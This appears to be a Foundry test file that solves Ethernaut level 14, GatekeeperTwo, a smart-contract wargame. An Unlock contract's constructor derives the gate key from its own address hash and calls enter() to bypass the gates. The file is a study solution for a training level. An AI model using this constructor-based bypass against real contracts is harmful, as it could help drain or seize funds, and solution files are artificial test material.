// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_14/GatekeeperTwo.sol";

contract GateKeeperTwoTest is Test {
    GatekeeperTwo gatekeeper;
    Unlock unlock;

    function setUp() public {
        gatekeeper = new GatekeeperTwo();
    }

    function testAttack() public {
        unlock = new Unlock(gatekeeper);
        assert(unlock.result());
    }
}

contract Unlock {
    GatekeeperTwo gatekeeper;
    bool public result;

    constructor(GatekeeperTwo _gatekeeper) {
        gatekeeper = _gatekeeper;
        uint256 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        bytes8 _key = bytes8(uint64(key));

        result = gatekeeper.enter(_key);
    }
}
